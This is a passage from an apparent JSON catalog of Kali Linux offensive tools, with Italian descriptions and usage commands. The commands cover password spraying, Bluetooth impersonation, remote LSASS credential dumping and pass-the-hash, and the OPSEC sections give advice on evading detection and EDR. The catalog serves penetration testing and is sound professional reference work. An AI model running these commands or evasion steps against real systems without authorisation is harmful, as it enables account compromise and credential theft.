wlan0mon --gps /dev/ttyUSB0\n\n# Modalita drone hunting\nsudo sparrow-wifi -i wlan0mon --drone --alert\n\n# Registrazione su file\nsudo sparrow-wifi -i wlan0mon --log /tmp/wifi_survey.csv</code></pre><p>Configurare l'interfaccia in monitor mode con airmon-ng prima dell'utilizzo. Attendere il fix GPS per risultati ottimali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>audit wireless aziendali</strong>, mappa tutti gli access point identificando rogue AP e configurazioni insicure. Per <strong>wardriving e survey</strong>, documenta la distribuzione geografica delle reti wireless e la portata del segnale oltre i confini dell'organizzazione. Per <strong>sicurezza fisica</strong>, rileva droni non autorizzati in aree sensibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modalita monitor genera frame di probe request rilevabili da WIDS. Alcuni access point enterprise registrano MAC di dispositivi in scanning passivo.</p><p><strong>Impatto operativo:</strong> La modalita monitor disabilita la connettivita standard sull'interfaccia. Il wardriving puo avere implicazioni legali in alcune giurisdizioni.</p><p><strong>Mitigazioni:</strong> Utilizzare scansione passiva per ridurre il profilo. Verificare la normativa locale sulla raccolta dati WiFi. Usare interfaccia dedicata separata dalla connettivita operativa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "spiderfoot",
    "name": "spiderfoot",
    "version": "4.0",
    "icon": "../app/icons/spiderfoot-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spiderfoot/",
    "desc": "Piattaforma OSINT automatizzata con 200+ moduli per footprinting e threat intelligence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SpiderFoot</strong> e una piattaforma OSINT automatizzata con oltre 200 moduli per raccolta e correlazione di informazioni da fonti pubbliche. Investiga domini, IP, email, telefoni e nomi di persone aggregando dati da decine di servizi online. Offre interfaccia web per gestione scansioni, visualizzazione tramite grafici di correlazione e generazione report. Supporta integrazione con API di Shodan, VirusTotal, HaveIBeenPwned, Censys e molte altre.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Motore di correlazione automatico:</strong> Non si limita a raccogliere dati ma correla automaticamente informazioni da fonti diverse costruendo un grafo di relazioni tra entita. Scopre ricorsivamente sottodomini, IP, record DNS, certificati SSL e email associate.</p><p><strong>Oltre 200 moduli di raccolta:</strong> Include moduli per DNS, WHOIS, social media, breach database, motori di ricerca, dark web, certificati SSL e bucket cloud esposti. Ogni modulo puo essere attivato individualmente per personalizzare la scansione.</p><p><strong>Interfaccia web e API REST:</strong> GUI web intuitiva per lanciare scansioni, monitorare il progresso e esplorare risultati con grafici interattivi. L'API REST permette integrazione con pipeline di sicurezza automatizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzabile tramite interfaccia web o riga di comando. La modalita web e consigliata per investigazioni complesse.</p><pre><code># Avvio interfaccia web\nspiderfoot -l 127.0.0.1:5001\n\n# Scansione CLI di un dominio\nspiderfoot -s target.com -t DOMAIN_NAME -o csv\n\n# Scansione con moduli specifici\nspiderfoot -s target.com -m sfp_dnsresolve,sfp_whois,sfp_sslcert -o json\n\n# Investigazione su indirizzo email\nspiderfoot -s admin@target.com -t EMAILADDR</code></pre><p>Configurare le chiavi API dei servizi di terze parti nell'interfaccia web per scansioni approfondite.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>mappatura della superficie di attacco</strong>, enumera tutti gli asset digitali dell'organizzazione inclusi sottodomini, IP, servizi esposti e credenziali compromesse. Per <strong>threat intelligence</strong>, indaga su IOC e traccia infrastrutture di attacco tramite analisi di fonti aperte e dark web. Per <strong>due diligence</strong>, verifica la postura di sicurezza di partner e fornitori.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Alcuni moduli generano traffico diretto verso il target. I servizi di terze parti registrano le query associandole alla chiave API. L'utilizzo intensivo puo attivare rate limiting.</p><p><strong>Impatto operativo:</strong> Scansioni complete richiedono ore e generano traffico significativo. I risultati contengono informazioni sensibili da proteggere secondo le normative sulla privacy.</p><p><strong>Mitigazioni:</strong> Distinguere tra moduli passivi e attivi per controllare il profilo. Utilizzare chiavi API dedicate. Conservare risultati in modo sicuro e cancellarli al termine.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Frameworks"
    ],
    "notes": null
  },
  {
    "id": "sploitscan",
    "name": "sploitscan",
    "version": "0.10.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sploitscan/",
    "desc": "Cerca CVE e exploit disponibili aggregando info da NVD, EPSS, CISA KEV.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SploitScan</strong> e uno strumento di aggregazione e analisi vulnerabilita che fornisce una vista unificata su CVE raccogliendo dati da NVD, EPSS, CISA KEV e database di exploit pubblici come Exploit-DB e GitHub. L'obiettivo e fornire tutte le informazioni per valutare rapidamente la gravita reale di una vulnerabilita e la probabilita che venga sfruttata. E particolarmente utile nella prioritizzazione dove la combinazione di CVSS, EPSS e stato KEV determina quali vulnerabilita richiedono intervento immediato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Aggregazione multi-sorgente:</strong> Raccoglie da NVD (descrizione, CVSS, CPE), EPSS (probabilita di exploitation nei prossimi 30 giorni), CISA KEV (vulnerabilita attivamente sfruttate) e database di exploit. Elimina la necessita di consultare manualmente ciascuna fonte.</p><p><strong>Valutazione del rischio integrata:</strong> Combina CVSS con EPSS e stato KEV per una valutazione piu accurata. Una CVE con CVSS alto ma EPSS basso puo essere deprioritizzata rispetto a una attivamente sfruttata con exploit pubblici.</p><p><strong>Ricerca exploit pubblici:</strong> Cerca automaticamente PoC e exploit su Exploit-DB, GitHub e Packet Storm fornendo link diretti al codice, utile sia per red team che per comprendere le capacita di attacco disponibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accetta identificativi CVE e restituisce un report completo. Richiede connettivita internet per le API.</p><pre><code># Analisi singola CVE\nsploitscan CVE-2024-21762\n\n# Analisi di multiple CVE\nsploitscan CVE-2024-21762 CVE-2024-1709 CVE-2024-27198\n\n# Analisi da file\nsploitscan -f vulnerabilities.txt\n\n# Output JSON per integrazione\nsploitscan CVE-2024-21762 -o json</code></pre><p>Utilizzare dopo scansioni di vulnerabilita per arricchire i risultati con informazioni contestuali sul rischio reale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>prioritizzazione delle vulnerabilita</strong>, concentra le risorse sulle CVE con rischio maggiore combinando severita tecnica, probabilita di sfruttamento ed evidenza di exploitation attiva. Per <strong>exploit research</strong>, identifica rapidamente exploit pubblici per vulnerabilita scoperte durante lo scanning. Per <strong>threat intelligence</strong>, verifica se le vulnerabilita nell'infrastruttura sono attivamente sfruttate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query verso servizi esterni vengono registrate. Ricerche su Exploit-DB per exploit specifici possono essere correlate ad attivita di preparazione attacchi. L'utilizzo intensivo puo attivare rate limiting.</p><p><strong>Impatto operativo:</strong> Dipende dalla disponibilita delle fonti esterne. Le informazioni EPSS vengono aggiornate quotidianamente. Nuove CVE potrebbero non avere ancora dati EPSS o valutazione KEV.</p><p><strong>Mitigazioni:</strong> Utilizzare API con rate limiting appropriato. Configurare chiavi API quando disponibili. Integrare con fonti di intelligence aggiuntive e conservare risultati localmente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "spooftooph",
    "name": "spooftooph",
    "version": "0.5.2",
    "icon": "../app/icons/spooftooph-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spooftooph/",
    "desc": "Clona dispositivi Bluetooth spoofando indirizzo MAC e device class per attacchi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Spooftooph</strong> e uno strumento specializzato nello spoofing di dispositivi Bluetooth. Permette di modificare BD_ADDR (l'equivalente BT del MAC), nome del dispositivo e classe del device sull'adattatore locale per impersonare altri dispositivi. Puo scansionare l'ambiente per rilevare dispositivi attivi e clonarne automaticamente le caratteristiche. E rilevante in scenari dove il trust Bluetooth si basa sull'identita del device. Supporta anche generazione di profili casuali per protezione della privacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Spoofing BD_ADDR:</strong> Modifica l'indirizzo hardware Bluetooth a livello firmware. Permette di impersonare un dispositivo specifico o cambiare identita per evitare tracciamento. La modifica e temporanea e reversibile al riavvio dell'adattatore.</p><p><strong>Clonazione completa del profilo:</strong> Replica simultaneamente BD_ADDR, nome e classe (smartphone, cuffie, tastiera) di un target specifico. La clonazione completa supera controlli che verificano multiple caratteristiche del dispositivo.</p><p><strong>Scansione e catalogazione:</strong> Include discovery che scansiona dispositivi Bluetooth attivi raccogliendone le caratteristiche. I profili rilevati possono essere salvati per utilizzo successivo anche quando il target non e nel raggio d'azione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede adattatore Bluetooth compatibile con modifica BD_ADDR a livello firmware. La compatibilita varia tra chipset.</p><pre><code># Scansione dispositivi Bluetooth nelle vicinanze\nspooftooph -s\n\n# Clonazione di un dispositivo (BD_ADDR e nome)\nspooftooph -i hci0 -a 00:11:22:33:44:55 -n \"Galaxy S24\"\n\n# Clonazione completa con classe dispositivo\nspooftooph -i hci0 -a 00:11:22:33:44:55 -n \"AirPods Pro\" -c 0x240404\n\n# Randomizzazione indirizzo\nspooftooph -i hci0 -r\n\n# Salvataggio e caricamento profili\nspooftooph -i hci0 -w profili_bt.log\nspooftooph -i hci0 -R profili_bt.log</code></pre><p>La classe (CoD) e un valore esadecimale che identifica il tipo di device. Replicare la classe corretta e essenziale per clonazione credibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>testing sicurezza pairing Bluetooth</strong>, verifica se applicazioni si affidano esclusivamente all'identita del device per il trust. Per <strong>social engineering BT</strong>, impersona dispositivi fidati per indurre la vittima ad accettare pairing malevoli. Per <strong>privacy dell'operatore</strong>, la randomizzazione impedisce il tracciamento durante ricognizione Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> WIPS possono rilevare incoerenze tra indirizzo, OUI del produttore e caratteristiche RF. Due dispositivi con stesso BD_ADDR generano anomalie facilmente identificabili.</p><p><strong>Impatto operativo:</strong> Bluetooth ha raggio limitato (10-100m) richiedendo prossimita fisica. Non tutti gli adattatori supportano modifica BD_ADDR. Richiede disconnessione dei dispositivi collegati.</p><p><strong>Mitigazioni:</strong> Verificare compatibilita dell'adattatore. Evitare spoofing in presenza del dispositivo originale. Randomizzare l'indirizzo tra operazioni per evitare tracciamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "spray",
    "name": "spray",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spray/",
    "desc": "Password spraying tool per Active Directory via SMB con rate limiting integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Spray</strong> e uno strumento dedicato al password spraying su Active Directory tramite SMB. Testa una singola password comune contro molti account, riducendo il rischio di lockout rispetto al brute force tradizionale. Include rate limiting integrato e rispetto dei threshold di lockout della policy AD. Utilizza autenticazione NTLM su SMB, compatibile con la maggior parte delle configurazioni. E tra gli strumenti piu usati per ottenere accesso iniziale a domini AD attraverso credenziali deboli.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Autenticazione SMB/NTLM:</strong> Verifica credenziali tramite SMB con NTLM, distinguendo tra credenziali valide, password scadute, account disabilitati e bloccati. Fornisce informazioni dettagliate su ogni tentativo di autenticazione.</p><p><strong>Gestione rate limiting:</strong> Implementa delay configurabili tra tentativi per rispettare la finestra di osservazione della password policy AD, evitando lockout che si attivano dopo tentativi falliti in una finestra temporale definita.</p><p><strong>Modalita spraying flessibili:</strong> Supporta test di singola password su lista utenti e test sequenziale di multiple password con pause tra cicli, adattando la strategia alla password policy del dominio target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede lista di utenti validi del dominio e indirizzo di un Domain Controller. Essenziale conoscere la password policy prima di procedere.</p><pre><code># Spray singola password su lista utenti\nspray -u users.txt -p 'Welcome2024!' -d corp.local 10.10.10.1\n\n# Spray con delay di 5 secondi\nspray -u users.txt -p 'Password123' -d corp.local -t 5 10.10.10.1\n\n# Spray con lista password e pausa tra cicli\nspray -u users.txt -P common_passwords.txt -d corp.local -T 1800 10.10.10.1\n\n# Output dettagliato\nspray -u users.txt -p 'Summer2024!' -d corp.local -v 10.10.10.1</code></pre><p>Enumerare la password policy con CrackMapExec o ldapsearch prima dell'esecuzione per conoscere threshold e finestra di osservazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per l'<strong>accesso iniziale ad AD</strong>, identifica utenti con password deboli senza causare lockout massivi. Per il <strong>testing della password policy</strong>, verifica se la policy di complessita previene password facilmente indovinabili. Per la <strong>validazione delle detection</strong>, il blue team verifica che SIEM rilevi correttamente pattern di spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Ogni tentativo fallito genera evento 4625 nel Security Event Log, correlabile da SIEM. Pattern di spraying sono riconosciuti da Microsoft Defender for Identity e CrowdStrike.</p><p><strong>Impatto operativo:</strong> Un calcolo errato del threshold puo bloccare numerosi account causando disservizi significativi. Account di servizio critici con password deboli potrebbero essere bloccati.</p><p><strong>Mitigazioni:</strong> Enumerare accuratamente la password policy. Testare su pochi account prima. Mantenere margine di sicurezza rispetto al threshold e coordinare con il team difensivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayhound",
    "name": "sprayhound",
    "version": "0.0~git20241231.5e7bf94",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayhound/",
    "desc": "Password spraying sicuro su AD con integrazione BloodHound per evitare lockout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayHound</strong> e uno strumento avanzato di password spraying per Active Directory con integrazione nativa BloodHound e Neo4j. Prima di ogni tentativo, interroga il database per verificare il badPwdCount di ciascun utente, assicurandosi di non superare il threshold di lockout. Questo approccio basato su dati reali offre garanzie superiori rispetto ai tool che si basano solo su timer e delay. E particolarmente efficace con una raccolta BloodHound recente che fornisce dati aggiornati sullo stato degli account.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Integrazione BloodHound e Neo4j:</strong> Si connette al database Neo4j di BloodHound per accedere ai dati utenti. Interroga il badPwdCount prima di ogni autenticazione, escludendo automaticamente utenti vicini al threshold di lockout.</p><p><strong>Selezione intelligente dei target:</strong> Analizza i dati per selezionare utenti con badPwdCount basso o azzerato. Utenti con tentativi falliti accumulati vengono esclusi, garantendo margine di sicurezza per ogni tentativo.</p><p><strong>Rispetto della observation window:</strong> Tiene conto della finestra temporale dopo la quale badPwdCount viene resettato, pianificando le ondate di spraying per allinearsi con il reset e massimizzare i tentativi sicuri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede dati BloodHound importati in Neo4j accessibile. Necessita credenziali per il database e informazioni sul dominio AD target.</p><pre><code># Spray con verifica BloodHound\nsprayhound -u users.txt -p 'Welcome2024!' -d corp.local -dc dc01.corp.local\n\n# Con connessione Neo4j e threshold\nsprayhound -u users.txt -p 'Summer2024!' -d corp.local --neo4j-uri bolt://localhost:7687 --neo4j-user neo4j --neo4j-pass bloodhound --threshold 3\n\n# Margine di sicurezza elevato\nsprayhound -u users.txt -p 'Company1!' -d corp.local -dc dc01.corp.local --safety-margin 2\n\n# Con aggiornamento LDAP in tempo reale\nsprayhound -u users.txt -p 'Password1' -d corp.local -dc dc01.corp.local --ldap-update</code></pre><p>Aggiornare i dati BloodHound immediatamente prima dell'operazione per garantire accuratezza dei contatori.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>spraying sicuro in produzione</strong>, la verifica badPwdCount fornisce garanzie aggiuntive dove il lockout causerebbe disservizi inaccettabili. Per <strong>red team prolungato</strong>, distribuisce lo spraying su periodi estesi monitorando lo stato degli account in tempo reale. Per <strong>testing password policy</strong>, identifica credenziali deboli senza rischiare interruzioni del servizio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Ogni tentativo fallito genera evento 4625 nel DC indipendentemente dalla sicurezza dal lockout. Microsoft Defender for Identity rileva pattern di spraying. Le query LDAP per badPwdCount generano traffico correlabile.</p><p><strong>Impatto operativo:</strong> Dipende dalla qualita dei dati BloodHound. Dati raccolti giorni prima potrebbero non riflettere lo stato attuale dei contatori. La connessione Neo4j deve essere disponibile durante l'intera operazione.</p><p><strong>Mitigazioni:</strong> Aggiornare BloodHound immediatamente prima dello spraying. Impostare margine di sicurezza conservativo. Monitorare i log durante l'operazione per lockout imprevisti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayingtoolkit",
    "name": "sprayingtoolkit",
    "version": "0.0~git20201009.68f295d",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayingtoolkit/",
    "desc": "Password spray su OWA, Lync, ADFS e altri portali Microsoft cloud e on-premise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayingToolkit</strong> e una suite completa per attacchi di password spraying progettata specificamente per colpire servizi Microsoft sia cloud che on-premise. Lo strumento integra moduli dedicati per Outlook Web Access (OWA), Lync/Skype for Business, Active Directory Federation Services (ADFS) e Office 365, permettendo di testare credenziali deboli su larga scala. A differenza dei tradizionali brute forcer, SprayingToolkit implementa strategie di spraying intelligenti che testano una singola password contro molti utenti prima di passare alla successiva, riducendo drasticamente il rischio di lockout degli account. Il toolkit gestisce automaticamente le particolarita di autenticazione di ogni servizio Microsoft, incluse le differenze tra endpoint SOAP, REST e EWS, rendendo il processo di testing unificato e coerente. La suite e particolarmente efficace durante assessment esterni dove i portali Microsoft rappresentano spesso l'unico punto di ingresso disponibile per un attaccante.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Atomizer Multi-Service:</strong> Il modulo principale Atomizer supporta spray simultaneo su OWA, Lync, ADFS e Office 365 con un'interfaccia unificata. Ogni protocollo ha un handler dedicato che gestisce le specificita dell'autenticazione, inclusi i redirect ADFS e la negoziazione NTLM su OWA. Il modulo rileva automaticamente la versione del servizio e adatta i payload di conseguenza.</p><p><strong>User Enumeration e Validazione:</strong> Prima di eseguire lo spray, il toolkit puo verificare l'esistenza degli account utente tramite tecniche specifiche per ogni servizio come SMTP enumeration, ActiveSync timing attack e risposte ADFS differenziali. Questo passaggio preliminare riduce il rumore generato e concentra l'attacco solo su account validi, migliorando l'efficienza e riducendo le probabilita di rilevamento.</p><p><strong>Rate Limiting e Lockout Avoidance:</strong> Il toolkit implementa delay configurabili tra i tentativi, sia per utente che globali, con supporto per jitter randomizzato che rende il pattern di traffico meno prevedibile. Include inoltre la capacita di rispettare le policy di lockout di Azure AD, pausando automaticamente lo spray quando vengono rilevati segnali di throttling o blocco temporaneo degli account.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SprayingToolkit richiede Python 3 e le relative dipendenze. Il modulo Atomizer e il componente principale per eseguire gli spray. E fondamentale preparare liste di utenti validate e utilizzare password comuni o stagionali (es. Estate2024!) per massimizzare l'efficacia.</p><pre><code># Spray su OWA con singola password\natomizer owa https://mail.target.com users.txt \"Password123!\"\n\n# Spray su Lync/Skype for Business\natomizer lync https://lyncdiscover.target.com users.txt passwords.txt\n\n# Spray su ADFS con delay tra tentativi\natomizer adfs https://adfs.target.com users.txt passwords.txt --interval 30\n\n# Spray su Office 365 con jitter\natomizer o365 users.txt passwords.txt --interval 30 --jitter 5\n\n# Enumeration utenti via OWA timing\nvaporizer owa https://mail.target.com potential_users.txt valid_users.txt</code></pre><p>Il parametro --interval e cruciale: valori troppo bassi rischiano lockout, mentre valori superiori a 30 minuti sono generalmente sicuri per la maggior parte delle policy Azure AD. Per O365, le smart lockout policy di Microsoft rendono necessario un approccio particolarmente cauto con intervalli di almeno 60 minuti tra ogni round di spray.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>external penetration test</strong>, SprayingToolkit viene utilizzato per testare portali Microsoft esposti su Internet come OWA e ADFS, cercando credenziali deboli che permettano l'accesso iniziale alla rete aziendale. Spesso il portale OWA e l'unico servizio esposto e rappresenta il vettore di ingresso piu promettente. In scenari di <strong>red team engagement</strong>, lo spray viene combinato con OSINT preliminare per costruire liste di utenti accurate basate su LinkedIn e altre fonti pubbliche, testando poi password stagionali o derivate dal nome dell'azienda. Per attivita di <strong>security audit</strong>, il toolkit permette di verificare l'enforcement delle password policy aziendali, identificando utenti che utilizzano password deboli o predicibili nonostante le policy configurate, fornendo evidenza concreta per raccomandazioni di hardening.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Azure AD e Office 365 loggano tutti i tentativi di autenticazione nel Sign-in Log, inclusi IP sorgente e user agent. Le soluzioni SIEM moderne correlano automaticamente tentativi di login falliti da un singolo IP contro multipli account, identificando pattern di spray. Smart Lockout di Azure AD puo bloccare temporaneamente gli account o richiedere CAPTCHA dopo tentativi sospetti.</p><p><strong>Impatto operativo:</strong> Uno spray troppo aggressivo puo causare il lockout massivo di account utente, generando un denial of service involontario e attirando immediatamente l'attenzione del SOC. Anche in caso di successo, l'accesso potrebbe essere bloccato da Conditional Access Policy o MFA, rendendo le credenziali trovate inutilizzabili senza ulteriori bypass.</p><p><strong>Mitigazioni:</strong> Utilizzare VPN o proxy residenziali per evitare blocchi basati su IP reputation. Impostare intervalli di almeno 30-60 minuti tra i round di spray. Modificare lo user agent per simulare client legittimi come Outlook o browser. Limitare il numero di password testate a 2-3 per sessione giornaliera e preferire password stagionali ad alta probabilita di successo piuttosto che wordlist generiche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "spraykatz",
    "name": "spraykatz",
    "version": "0.9.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spraykatz/",
    "desc": "Dumpa credenziali da memoria LSASS su host Windows remoti via procdump e Mimikatz.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayKatz</strong> e uno strumento di credential dumping remoto che automatizza il processo di estrazione credenziali dalla memoria LSASS su host Windows remoti. Lo strumento combina l'utilizzo di procdump (un tool legittimo Sysinternals) per creare dump del processo LSASS con pypykatz per l'analisi offline dei dump, evitando di caricare Mimikatz direttamente sugli host target. SprayKatz opera tramite protocolli SMB e WMI per distribuire ed eseguire procdump sugli host remoti, raccogliere i dump risultanti e analizzarli localmente sulla macchina dell'attaccante. Questa architettura distribuita permette di operare su reti ampie con centinaia di host, automatizzando un processo che manualmente richiederebbe ore di lavoro ripetitivo. Lo strumento gestisce automaticamente la pulizia dei file temporanei sugli host target dopo l'estrazione, riducendo le tracce forensi lasciate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Remote LSASS Dumping via Procdump:</strong> SprayKatz carica procdump.exe sugli host target tramite share SMB amministrative (C$ o ADMIN$), lo esegue remotamente via WMI o SMBExec per creare un dump del processo LSASS, e recupera il file dump risultante. L'utilizzo di procdump, essendo un tool Sysinternals firmato Microsoft, offre maggiori probabilita di evasione rispetto a strumenti non firmati, anche se gli EDR moderni monitorano specificamente l'accesso al processo LSASS indipendentemente dallo strumento utilizzato.</p><p><strong>Analisi Offline con Pypykatz:</strong> I dump LSASS vengono analizzati localmente sulla macchina dell'attaccante utilizzando pypykatz, un'implementazione Python di Mimikatz. Questo approccio evita di eseguire Mimikatz sugli host target, riducendo significativamente la probabilita di rilevamento da parte di soluzioni antivirus e EDR che hanno signature specifiche per Mimikatz. L'analisi offline permette inoltre di riesaminare i dump con versioni aggiornate di pypykatz se necessario.</p><p><strong>Operazioni di Massa e Gestione Credenziali:</strong> Il tool supporta file di target multipli e puo operare simultaneamente su intere subnet, aggregando tutte le credenziali estratte in un output unificato. Supporta autenticazione tramite password, hash NTLM e ticket Kerberos, permettendo l'utilizzo di credenziali gia ottenute per pivot verso nuovi host. Le credenziali estratte vengono organizzate per host, facilitando la mappatura delle sessioni attive nella rete.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SprayKatz richiede credenziali amministrative locali o di dominio sugli host target. Lo strumento e scritto in Python e utilizza impacket per le operazioni di rete. E consigliabile operare da una macchina Linux per evitare problemi di compatibilita.</p><pre><code># Dump da singolo host con password\nspraykatz -u administrator -p 'P@ssw0rd' -d domain.local -t 192.168.1.100\n\n# Dump da lista di host\nspraykatz -u admin -p 'Password1' -d CORP -T targets.txt\n\n# Autenticazione con hash NTLM (pass-the-hash)\nspraykatz -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 -t 192.168.1.0/24\n\n# Specificare directory di output personalizzata\nspraykatz -u admin -p 'Pass123' -d domain.local -t 192.168.1.100 -o /tmp/dumps\n\n# Utilizzare Kerberos per autenticazione\nspraykatz -u admin -p 'Pass123' -d domain.local -t 192.168.1.100 -k</code></pre><p>I dump vengono salvati nella directory di output e analizzati automaticamente. Le credenziali estratte includono password in chiaro (quando disponibili), hash NTLM, ticket Kerberos e chiavi di sessione. In ambienti con Credential Guard abilitato, i dump LSASS non conterranno credenziali in chiaro ne hash NTLM utilizzabili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>credential harvesting</strong> post-compromissione, SprayKatz viene utilizzato per raccogliere credenziali da tutti gli host accessibili nella rete, costruendo una mappa completa delle credenziali disponibili per lateral movement. Nel contesto di <strong>domain privilege escalation</strong>, lo strumento permette di cercare sessioni di Domain Admin attive su workstation e server, estraendo le loro credenziali per escalare al dominio completo. Per <strong>security assessment interni</strong>, il tool dimostra l'impatto della compromissione di un singolo host, mostrando come le credenziali cached in LSASS permettano di propagarsi lateralmente attraverso l'intera rete aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'accesso al processo LSASS e uno degli eventi piu monitorati dalle soluzioni EDR moderne. Sysmon logga gli eventi ProcessAccess (Event ID 10) quando procdump accede a LSASS, e Windows Defender ATP genera alert specifici per dump LSASS. Anche l'upload di procdump.exe via SMB e il suo avvio remoto via WMI generano eventi facilmente correlabili (Sysmon Event ID 1 per la creazione del processo, Event ID 11 per la creazione del file).</p><p><strong>Impatto operativo:</strong> Su sistemi con Credential Guard abilitato (Windows 10/11 Enterprise), i dump LSASS non conterranno credenziali utili. Protected Process Light (PPL) su LSASS impedisce a procdump di accedere al processo senza driver kernel-mode. La rimozione dei file dump potrebbe fallire lasciando artefatti forensi sugli host target.</p><p><strong>Mitigazioni:</strong> Considerare l'uso di tecniche alternative di dump LSASS come MiniDumpWriteDump tramite API call dirette, SilentProcessExit o comsvcs.dll che potrebbero essere meno monitorati. Operare durante orari lavorativi per confondersi con il traffico legittimo SMB/WMI. Verificare preventivamente la presenza di EDR sugli host target prima di tentare il dump.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sqldict",
    "name": "sqldict",
    "version": "2.1",
    "icon": "../app/icons/sqldict-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqldict/",
    "desc": "Brute force password per account SQL Server usando wordlist e parallel attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLDict</strong> e uno strumento specializzato per attacchi di tipo dictionary attack contro istanze Microsoft SQL Server. Il tool tenta sistematicamente combinazioni di username e password da wordlist predefinite per identificare credenziali deboli su database MSSQL esposti. SQLDict supporta connessioni parallele per accelerare il processo di testing e opera sia su istanze default che su porte personalizzate. Lo strumento e particolarmente utile durante penetration test dove vengono identificate istanze SQL Server esposte sulla rete, spesso configurate con account sa (system administrator) ancora attivi e password deboli. A differenza di tool generici di brute force, SQLDict gestisce nativamente il protocollo TDS (Tabular Data Stream) di SQL Server, garantendo compatibilita con tutte le versioni del database da SQL Server 2000 in poi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Dictionary Attack Mirato:</strong> SQLDict utilizza wordlist per testare combinazioni username/password contro il sistema di autenticazione SQL Server. Il tool supporta sia la SQL Server Authentication (account interni) che la Mixed Mode Authentication, adattandosi automaticamente alla configurazione del server. La possibilita di fornire sia liste di utenti che di password permette di testare matrici complete di combinazioni.</p><p><strong>Connessioni Parallele:</strong> Lo strumento supporta thread multipli per eseguire tentativi di autenticazione simultanei, riducendo significativamente il tempo necessario per completare un attacco 